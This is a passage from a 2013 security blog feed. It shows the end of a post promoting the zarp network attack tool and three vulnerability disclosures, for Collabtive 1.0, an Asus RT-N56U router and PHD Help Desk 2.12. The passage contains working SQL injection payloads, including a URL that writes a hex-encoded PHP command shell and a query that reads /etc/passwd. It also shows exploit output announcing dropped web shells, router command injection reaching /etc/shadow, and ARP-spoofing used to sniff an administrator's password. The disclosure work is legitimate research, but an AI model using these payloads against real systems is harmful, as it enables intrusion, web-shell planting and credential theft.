</span><span class='line'>[5] SMB2 DoS
</span><span class='line'>[6] TCP SYN
</span><span class='line'>[7] IPv6 Neighbor Unreachability Detection DoS
</span><span class='line'>[8] Linux 2.6.36 - 3.2.1 IGMP DoS
</span><span class='line'>[9] MS13-018 Win7/8 DoS
</span><span class='line'>
</span><span class='line'>0) Back
</span><span class='line'>&gt; 0 3
</span><span class='line'> ____   __   ____  ____
</span><span class='line'>(__  ) / _\ (  _ \(  _ '
</span><span class='line'> / _/ /    \ )   / ) __/
</span><span class='line'>(____)\_/\_/(__\_)(__)
</span><span class='line'>    [Version 0.1.3]            
</span><span class='line'>[1] HTTP Sniffer
</span><span class='line'>[2] Password Sniffer
</span><span class='line'>[3] Traffic Sniffer
</span><span class='line'>[4] Database Sniffer
</span><span class='line'>[5] Packet Modifier
</span><span class='line'>
</span><span class='line'>0) Back
</span><span class='line'>&gt; </span></code></pre></td></tr></table></div></figure>


<p>Also included are various router exploits, switch flooding, ARP shells, access point cracking, and more.  Zarp also allows modules to set CLI options, which can be used like any regular CLI application:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bryan@devbox:~/zarp$ sudo ./zarp.py --help
</span><span class='line'>[!] Loaded 35 modules.
</span><span class='line'>     ____   __   ____  ____
</span><span class='line'>    (__  ) / _\ (  _ \(  _ '
</span><span class='line'>     / _/ /    \ )   / ) __/
</span><span class='line'>    (____)\_/\_/(__\_)(__)
</span><span class='line'>        [Version 0.1.3]            
</span><span class='line'>usage: zarp.py [-h] [-q FILTER] [--update] [--wap] [--ftp] [--http] [--smb]
</span><span class='line'>               [--ssh] [--telnet] [-w] [-s] [--service-scan]
</span><span class='line'>
</span><span class='line'>optional arguments:
</span><span class='line'>  -h, --help      show this help message and exit
</span><span class='line'>  -q FILTER       Generic network sniff
</span><span class='line'>  --update        Update Zarp
</span><span class='line'>
</span><span class='line'>Services:
</span><span class='line'>  --wap           Wireless access point
</span><span class='line'>  --ftp           FTP server
</span><span class='line'>  --http          HTTP Server
</span><span class='line'>  --smb           SMB Service
</span><span class='line'>  --ssh           SSH Server
</span><span class='line'>  --telnet        Telnet server
</span><span class='line'>
</span><span class='line'>Scanners:
</span><span class='line'>  -w              Wireless AP Scan
</span><span class='line'>  -s              Network scanner
</span><span class='line'>  --service-scan  Service scanner
</span><span class='line'>bryan@devbox:~/zarp$ sudo ./zarp.py --ssh
</span><span class='line'>[!] Loaded 35 modules.
</span><span class='line'>     ____   __   ____  ____
</span><span class='line'>    (__  ) / _\ (  _ \(  _ '
</span><span class='line'>     / _/ /    \ )   / ) __/
</span><span class='line'>    (____)\_/\_/(__\_)(__)
</span><span class='line'>        [Version 0.1.3]            
</span><span class='line'>[!] Starting SSH Server...</span></code></pre></td></tr></table></div></figure>


<p>The idea behind services is this: honeypots are scary effective at what they do because they exploit a certain trust a user has in a system, or address.  But, if I&rsquo;m able to DoS a web server, ARPP/DNS spoof the host into redirecting it to me, I can fetch credentials off them just by presenting a login.  These can be leveraged in any number of ways, including spoofing, social engineering, etc.</p>

<p>I realize that many of these attacks are not bleeding-edge; that&rsquo;s okay, for now.  I needed a solid foundation full of tried-and-true attacks that I can then expand upon; for this reason, I&rsquo;ve gone for breadth over depth, initially.  Modules are still being actively developed and features piled on.  zarp is currently lacking a few key features, such as packet modification and ssl stripping, but these are currently in development.  Moxie&rsquo;s sslstrip is fantastic, but I would prefer a native implementation without relying on twisted.</p>

<p>Now comes the future; what&rsquo;s the end-goal for zarp.  I see zarp as a master control system for a local network.  Plug it in and watch it grow.  Recently I&rsquo;ve added a database logging tool that formats certain key bits, username/passwords, hosts, logs, etc., and inserts them into a local sqlite3 database.  This will be expanded to eventually allow connections to postgresql/mysql servers for remote work and collaboration.  The idea behind this is to allow a web application the ability to aggregate everything zarp spits out and organize, analyze, and display this in a very powerful way.  This web application presents network topologies, host relationships, active connections, man-in-the-middle attacks, and more.  The television to zarp&rsquo;s remote control.</p>

<p>Though ambitious, I feel this could be an incredibly powerful tool that provides pentesters an invaluable service.  I&rsquo;m hoping this post garners a few users who can provide solid usage feedback and help iron out bugs or develop features; if you like what you&rsquo;ve seen, please check out the wiki or send me an email (drone AT ballastsecurity DOT net) or tweet (@dronesec).  Any and all feedback, including suggestions/bugs/questions, are welcome.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Collabtive 1.0 - SQLi]]></title>
    <link href="http://hatRiot.github.io/blog/2013/06/21/collabtive-1.0-sqli/"/>
    <updated>2013-06-21T23:40:53-06:00</updated>
    <id>http://hatRiot.github.io/blog/2013/06/21/collabtive-1.0-sqli</id>
    <content type="html"><![CDATA[<p><a href="http://collabtive.o-dyn.de/">Collabtive</a> is a web-based collaboration tool for project management, developed in PHP.  The latest version, Collabtive 1.0, is vulnerable to remote authenticated SQL injection.  Sourceforge page can be found <a href="http://sourceforge.net/projects/collabtive/?source=directory">here</a>, which appears to be clocking in just over 1000 downloads a week.  This issue was reported privately to the developers, and fixed in their Github <a href="https://github.com/philippK-de/Collabtive">repository</a>.</p>

<p>User profiles are viewed/managed by manageuser.php, and upon loading a profile, runs the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> if (!empty($start) and !empty($end)) {
</span><span class='line'>        $track = $tracker-&gt;getUserTrack($id, $fproject, $taski, $start, $end);
</span><span class='line'>    } elseif (is_array($fproject)) {
</span><span class='line'>        foreach ($fproject as $fpro) {
</span><span class='line'>            $ptrack = $tracker-&gt;getUserTrack($id, $fpro, $taski, $start, $end);
</span><span class='line'>            if (!empty($ptrack)) {
</span><span class='line'>                foreach ($ptrack as $mytrack) {
</span><span class='line'>                    array_push($track, $mytrack);
</span><span class='line'>                }
</span><span class='line'>            }
</span><span class='line'>        }
</span><span class='line'>    } </span></code></pre></td></tr></table></div></figure>


<p>Of interest is the <code>getUserTrack</code> function, as follows:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>function getUserTrack($user, $project = 0, $task = 0, $start = 0, $end = 0 , $lim = 50)
</span><span class='line'>    {
</span><span class='line'>        global $conn;
</span><span class='line'>        $user = (int) $user;
</span><span class='line'>        $project = (int) $project;
</span><span class='line'>        $lim = (int) $lim;
</span><span class='line'>
</span><span class='line'>        if ($project &gt; 0) {
</span><span class='line'>            $sql = "SELECT * FROM timetracker WHERE user = $user AND project = $project";
</span><span class='line'>            $num = "SELECT COUNT(*) FROM timetracker WHERE project = $project AND user = $user";
</span><span class='line'>            $order = " ORDER BY ended ASC";
</span><span class='line'>        } else {
</span><span class='line'>            $sql = "SELECT * FROM timetracker WHERE user = $user";
</span><span class='line'>            $num = "SELECT COUNT(*) FROM timetracker WHERE user = $user";
</span><span class='line'>            $order = " ORDER BY ended ASC";
</span><span class='line'>        }
</span><span class='line'>
</span><span class='line'>        if ($task &gt; 0) {
</span><span class='line'>            $sql .= " AND task = $task";
</span><span class='line'>            $num .= " AND task = $task";
</span><span class='line'>        }
</span><span class='line'>
</span><span class='line'>        if ($start &gt; 0 and $end &gt; 0) {
</span><span class='line'>            $start = strtotime($start);
</span><span class='line'>            $end = strtotime($end . " +1 day");
</span><span class='line'>            $end = $end - 1;
</span><span class='line'>            $sql .= " AND ended &gt;=$start AND ended&lt;=$end ";
</span><span class='line'>            $num .= " AND ended &gt;=$start AND ended&lt;=$end ";
</span><span class='line'>        }
</span><span class='line'>
</span><span class='line'>        if ($num) {
</span><span class='line'>            $num = $conn-&gt;query($num)-&gt;fetch();
</span><span class='line'>            $num = $num[0];
</span><span class='line'>        } else {
</span><span class='line'>            $num = 0;
</span><span class='line'>        }</span></code></pre></td></tr></table></div></figure>


<p>The start/end/task variables are not cast to integers, and are not sanitized.  Sanitization wouldn&rsquo;t do much here, anyways, as the variables are appended without quotations, so we need only space queries out from input.  For example, <code>task=1 UNION SELECT passwords FROM user</code>.  Thus we highlight the importance of parameterized queries.  Just use them.</p>

<p>This can be exploited with a simple UNION query to drop a shell:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.1.219/collabtive/manageuser.php?action=profile&id=1&task=1%20UNION%20SELECT%200x3c3f7068702073797374656d28245f4745545b227272225d293b3f3e%20INTO%20OUTFILE%20%27hcked%27;&project=1</span></code></pre></td></tr></table></div></figure>


<p>Exploiting:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jali:~/exploits# python collabtive_10_sqli.py -i 192.168.1.83 -P vlh4soc9k2t5vnp6s5d8glga17
</span><span class='line'>[!] Dropping web shell on 192.168.1.83...
</span><span class='line'>[!] Shell dropped.  http://192.168.1.83/collabtive/gkre4.php?rr=ls</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="http://1.bp.blogspot.com/-eVNRT30tTOU/Ub8_vbq_ZiI/AAAAAAAAAgM/ZssKBHVVMNs/s640/collabtive_10_sploit.jpg"></p>

<p><a href="http://www.exploit-db.com/exploits/26410/">Exploit</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Asus RT56U Remote Command Injection]]></title>
    <link href="http://hatRiot.github.io/blog/2013/06/05/asus-rt56u-remote-command-injection/"/>
    <updated>2013-06-05T23:45:20-06:00</updated>
    <id>http://hatRiot.github.io/blog/2013/06/05/asus-rt56u-remote-command-injection</id>
    <content type="html"><![CDATA[<p>After discovering a couple vulnerabilities in the Asus RT56U prior, I decided to check out the latest firmware and hunt around for a few more.</p>

<p>I was running 3.0.0.4.342, which happens to be one version behind the latest (3.0.0.4.360), so I did a sweep of both.  I enabled telnet on the router and hunted around, which led me to an unlinked page, Main_Analysis_Content.asp.  This page hosts a slew of diagnostic tools, including the ability to ping network systems.  See where this is going?</p>

<p><img class="center" src="http://4.bp.blogspot.com/-4C_1Ig7iJos/UZwIsAqjHqI/AAAAAAAAAeo/hC3nnlBbyb8/s640/command_injection.jpg"></p>

<p>And the related source code to this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>document.form.SystemCmd.value = "ping -c " + document.form.pingCNT.value + " " + document.form.destIP.value;</span></code></pre></td></tr></table></div></figure>


<p>Pretty trivial, and each command, ping, nslookup, and traceroute, is vulnerable.  The system is running an HTTP web server that serves up ASP pages, so we could wget and deploy a reverse ASP shell or set up a netcat listener.</p>

<p>I then took a look at the latest firmware, which touts the following changes:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ASUS RT-N56U Firmware Version 3.0.0.4.360
</span><span class='line'>1. AiCloud
</span><span class='line'>For iOS user, please upgrade app to 1.02.78 or above
</span><span class='line'>(for more information, please refer to http://event.asus.com/2012/nw/aicloud/index.htm)
</span><span class='line'>2. Network tools in Advanced setting
</span><span class='line'>3. WOL user interface
</span><span class='line'>4. H.323 and SIP passthrough can be disabled in Advanced Settings --&gt; WAN --&gt;NAT Passthrough
</span><span class='line'>5. Click the device name and lookup the manufacturer information
</span><span class='line'>6. Change the DHCP query frequency in Advanced settings--&gt;WAN--&gt;Internet connection to resolve the ISP compatibility issue.</span></code></pre></td></tr></table></div></figure>


<p>So it looks like the tools were added in the .342 (or earlier) firmware, but not actually linked until the .360 release.  I then flashed over the firmware to take a look at any changes.  It appeared they added a Network Tools section which, of course, allows us to:</p>

<p><img class="center" src="http://3.bp.blogspot.com/-ZFhW0bRKM3o/UZwoiPOXXyI/AAAAAAAAAe4/WyTtjhpQEho/s640/asus_exec_360.jpg"></p>

<p>It&rsquo;s kind of ridiculous that we can hit /etc/shadow with this.</p>

<p>As an aside, I thought about what sort of files might be accessible without authenticating to the web server.  Seeing as I had access to enumerate the file system, I constructed a listing of every file in the web server&rsquo;s root.  The code can be seen below:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>import urllib, urllib2
</span><span class='line'>
</span><span class='line'>def get_files():
</span><span class='line'>    files = []
</span><span class='line'>    with open('files_rt.txt', 'r') as f:
</span><span class='line'>        files = [x.strip() for x in f.readlines()]
</span><span class='line'>    print '[!] Built %d files to test...'%len(files)
</span><span class='line'>    return files
</span><span class='line'>
</span><span class='line'>def run():
</span><span class='line'>    files        = get_files()
</span><span class='line'>    open_files   = []
</span><span class='line'>
</span><span class='line'>    for f in files:
</span><span class='line'>        url = 'http://192.168.1.1/'+f
</span><span class='line'>        try:
</span><span class='line'>            data = urllib2.urlopen(url).read()
</span><span class='line'>        except urllib2.HTTPError as e:
</span><span class='line'>            continue
</span><span class='line'>
</span><span class='line'>        open_files.append(url)
</span><span class='line'>
</span><span class='line'>    print '[!] %d exposed files'%len(open_files)
</span><span class='line'>    for f in open_files: print '\t[!] %s'%f
</span><span class='line'>
</span><span class='line'>def parse_args():
</span><span class='line'>    pass
</span><span class='line'>
</span><span class='line'>if __name__ == "__main__":
</span><span class='line'>    run()</span></code></pre></td></tr></table></div></figure>


<p>When run, 42 files were exposed:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bryan@devbox:~$ python rt56u_iter.py 
</span><span class='line'>[!] Built 277 files to test...
</span><span class='line'>[!] 42 exposed files
</span><span class='line'>    [!] http://192.168.1.1/NM_style.css
</span><span class='line'>    [!] http://192.168.1.1/Nologin.asp
</span><span class='line'>    [!] http://192.168.1.1/PIE.htc
</span><span class='line'>    [!] http://192.168.1.1/ParentalControl.css
</span><span class='line'>    [!] http://192.168.1.1/WAN_info.asp
</span><span class='line'>    [!] http://192.168.1.1/app_installation.css
</span><span class='line'>    [!] http://192.168.1.1/detect_firmware.asp
</span><span class='line'>    [!] http://192.168.1.1/error_page.htm
</span><span class='line'>    [!] http://192.168.1.1/fan.svg
</span><span class='line'>    [!] http://192.168.1.1/form_style.css
</span><span class='line'>    [!] http://192.168.1.1/get_webdavInfo.asp
</span><span class='line'>    [!] http://192.168.1.1/gotoHomePage.htm
</span><span class='line'>    [!] http://192.168.1.1/httpd_check.htm
</span><span class='line'>    [!] http://192.168.1.1/index_style.css
</span><span class='line'>    [!] http://192.168.1.1/jquery.js
</span><span class='line'>    [!] http://192.168.1.1/menu_style.css
</span><span class='line'>    [!] http://192.168.1.1/other.css
</span><span class='line'>    [!] http://192.168.1.1/pwdmeter.css
</span><span class='line'>    [!] http://192.168.1.1/remote.asp
</span><span class='line'>    [!] http://192.168.1.1/tm.svg
</span><span class='line'>    [!] http://192.168.1.1/tmmenu.css
</span><span class='line'>    [!] http://192.168.1.1/update_applist.asp
</span><span class='line'>    [!] http://192.168.1.1/update_appstate.asp
</span><span class='line'>    [!] http://192.168.1.1/update_cloudstatus.asp
</span><span class='line'>    [!] http://192.168.1.1/ure_success.htm
</span><span class='line'>    [!] http://192.168.1.1/ureip.asp
</span><span class='line'>    [!] http://192.168.1.1/usp_style.css
</span><span class='line'>    [!] http://192.168.1.1/aidisk/AiDisk_style.css
</span><span class='line'>    [!] http://192.168.1.1/aidisk/aidisk.css
</span><span class='line'>    [!] http://192.168.1.1/device-map/device-map.css
</span><span class='line'>    [!] http://192.168.1.1/iui/Button_low.jpg
</span><span class='line'>    [!] http://192.168.1.1/iui/check.png
</span><span class='line'>    [!] http://192.168.1.1/iui/default-theme.css
</span><span class='line'>    [!] http://192.168.1.1/iui/iui.css
</span><span class='line'>    [!] http://192.168.1.1/iui/listArrow.png
</span><span class='line'>    [!] http://192.168.1.1/iui/listArrow_setting.png
</span><span class='line'>    [!] http://192.168.1.1/iui/toolButton.png
</span><span class='line'>    [!] http://192.168.1.1/calendar/fullcalendar.css
</span><span class='line'>    [!] http://192.168.1.1/svghtc/svg.htc
</span><span class='line'>    [!] http://192.168.1.1/svghtc/svg.swf
</span><span class='line'>    [!] http://192.168.1.1/qis/qis_style.css
</span><span class='line'>    [!] http://192.168.1.1/qis/qis_style_m.css</span></code></pre></td></tr></table></div></figure>


<p>A majority of the files are pretty useless/uninteresting, such as the css/jpg/png files, but a couple of the ASP files have some interesting information.  <code>Nologin.asp</code> lets us know every address the DHCP server has leased out, as well as the IP of the currently logged in administrator.  <code>get_webdavInfo.asp</code> gives us a bunch of great info, including the firmware version, DDNS information, mode of operation, and more.</p>

<p>The only really interesting page to me is <code>Nologin.asp</code>.  This gives us the currently logged in administrator; so, if we&rsquo;re on the local network, we can generate a short script that periodically pings the router and alerts us when an admin logs in.  We can then ARPP the administrator and hijack the password; this works because the router&rsquo;s web server doesn&rsquo;t do any session management, it simply uses basic HTTP auth to send the base64&rsquo;d password.</p>

<p>Observe:</p>

<p><img class="center" src="http://1.bp.blogspot.com/-uPMtGiHrr8c/Ua_L3lVLl9I/AAAAAAAAAf4/QIhMSOdOfvM/s640/no_login.jpg"></p>

<p>Now we know where the administrator is logged in.  We can now ARPP the host and hijack the password.  It is unnecessary for the administrator to actually be doing anything, because conveniently the client&rsquo;s browser sends out an ajax request to <code>/ajax_status.asp</code> quite often, complete with authentication credentials.  Using zarp, a network attack tool designed by yours truly, we can ARPP the admin and set up a password sniffer:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[Running sessions]
</span><span class='line'>[1] ARP Spoof
</span><span class='line'>[0] 192.168.1.219
</span><span class='line'>[2] Password Sniffer
</span><span class='line'>[0] 192.168.1.219
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>[1] Stop session
</span><span class='line'>[2] View session
</span><span class='line'>[3] Start session logger
</span><span class='line'>[4] Stop session logger
</span><span class='line'>
</span><span class='line'>0) Back
</span><span class='line'>&gt; 2
</span><span class='line'>[module] [number]&gt; 2 0
</span><span class='line'>[!] [enter] when finished
</span><span class='line'>[!] Dumping output from 'Password Sniffer'...
</span><span class='line'>[!] Host: 192.168.1.1
</span><span class='line'>[!] User: admin:*********</span></code></pre></td></tr></table></div></figure>


<p>Immediately we catch a heartbeat and grab the password (edited out).</p>

<p>Lastly, this is full disclosure.  Check out <a href="http://seclists.org/fulldisclosure/2013/Mar/126">this</a> listing for how Asus treats security researchers.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[PHD Help Desk 2.12 - SQLi/XSS]]></title>
    <link href="http://hatRiot.github.io/blog/2013/06/02/phd-help-desk-2.12-sqli-xss/"/>
    <updated>2013-06-02T23:55:27-06:00</updated>
    <id>http://hatRiot.github.io/blog/2013/06/02/phd-help-desk-2.12-sqli-xss</id>
    <content type="html"><![CDATA[<p><a href="http://www.p-hd.com.ar/">PHD Help Desk</a> is a help desk application used for managing help tickets in corporate/enterprise environments.  The latest version (2.12) is vulnerable to, well, quite a few instances of SQLi and XSS.  I&rsquo;ll try and go through a couple, but there are so many it&rsquo;s sort of embarrassing, and none of them are at all complex.  The software is clocking ~200 downloads/week on Sourceforge, and no telling how many off their website, so it&rsquo;s definitely still out there somewhere.  These issues have been disclosed to the vendor and a generous amount of time to fix them has since passed.</p>

<p>The first place we&rsquo;ll start is <code>login.php</code>, which tellingly holds all of the login logic.  Here&rsquo;s the relevant bit:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$operador=trim(strip_tags($_POST[operador]));
</span><span class='line'>$query="SELECT * FROM {$MyPHD}operador WHERE operador_id='$operador'";
</span><span class='line'>$result=mysql_query($query) or die(mysql_error());
</span><span class='line'>$q_filas=mysql_num_rows($result);
</span><span class='line'>
</span><span class='line'>if($q_filas!=1)
</span><span class='line'>       {$mensaje=$Oper_not_autorized;
</span><span class='line'>        require($Include.'login.inc');
</span><span class='line'>        exit();
</span><span class='line'>       }
</span><span class='line'>
</span><span class='line'>### Ahora verifico la contraseña
</span><span class='line'>$md5_contrasenia=md5($_POST['contrasenia']);
</span><span class='line'>
</span><span class='line'>$query="SELECT * FROM {$MyPHD}operador WHERE operador_id='$operador' AND contrasenia='$md5_contrasenia'";
</span><span class='line'>$result=mysql_query($query) or die (mysql_error());;
</span><span class='line'>$q_filas=mysql_num_rows($result);
</span><span class='line'>
</span><span class='line'>if ($q_filas!=1)
</span><span class='line'>             {$mensaje=$Invalid_passwd;
</span><span class='line'>             require($Include.'login.inc');
</span><span class='line'>             exit();
</span><span class='line'>            }
</span><span class='line'>
</span><span class='line'>$data=mysql_fetch_array($result);
</span><span class='line'>if ($data['nivel']&lt;1)
</span><span class='line'>               {$mensaje=$Oper_not_autorized;
</span><span class='line'>                require($Include.'login.inc');
</span><span class='line'>                exit();
</span><span class='line'>               }</span></code></pre></td></tr></table></div></figure>


<p>This doesn&rsquo;t even really try to sanitize anything.  <a href="http://php.net/manual/en/function.strip-tags.php">strip_tags</a> is used to remove HTML and PHP tags from a string, and <a href="http://php.net/manual/en/function.trim.php">trim</a> strips whitespace; what?  It pulls out the username, checks it in the database, then pulls the password, md5&rsquo;s it, and checks that in the database.  Plenty of opportunity for SQLi, but no way to get around the login screen with a simple <code>' OR '1=1</code>, due to the final query using the md5 of the password.  We could use a malicious username and comment that out, but then the first query would fail.  So instead, we&rsquo;ll just use the username to run malicious queries.</p>

<p>Submitting the following POST data to login.php will dump <code>/etc/passwd</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>operador=' UNION SELECT LOAD_FILE('/etc/passwd'),2,3,4,5,6,7,8,9,10,11,12,13,14 INTO OUTFILE '/var/www/phd_2_12/psswd&contrasenia=asdf&submit=Enter&captcha=</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="http://4.bp.blogspot.com/-Ss9O_o4PeAI/UaBAiG65xPI/AAAAAAAAAfI/CvOmVOtxEVw/s640/phd_psswd.jpg"></p>

<p>With this, we can naturally obtain a web shell, as demonstrated by the exploit code I&rsquo;ve developed:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jali:~# python phd_sqli.py -h
</span><span class='line'>usage: phd_sqli.py [-h] [-i IP] [-p ROOTP] [-w PATH]
</span><span class='line'>
</span><span class='line'>optional arguments:
</span><span class='line'>  -h, --help  show this help message and exit
</span><span class='line'>  -i IP       server address
</span><span class='line'>  -p ROOTP    path to login.php (/phd_2_12)
</span><span class='line'>  -w PATH     writable web path (/var/www/phd_2_12) for shell
</span><span class='line'>root@jali:~# python phd_sqli.py -i 192.168.1.83
</span><span class='line'>[!] Dropping web shell on 192.168.1.83...
</span><span class='line'>[!] Shell dropped.  http://192.168.1.83/phd_2_12/0m05k.php?rr=ls
</span><span class='line'>root@jali:~# </span></code></pre></td></tr></table></div></figure>


<p>As a note, <code>strip_slashes</code> prevents us from submitting anything that includes HTML or PHP tags in it. So I&rsquo;ve gotten around that by simply hex encoding the string:</p>

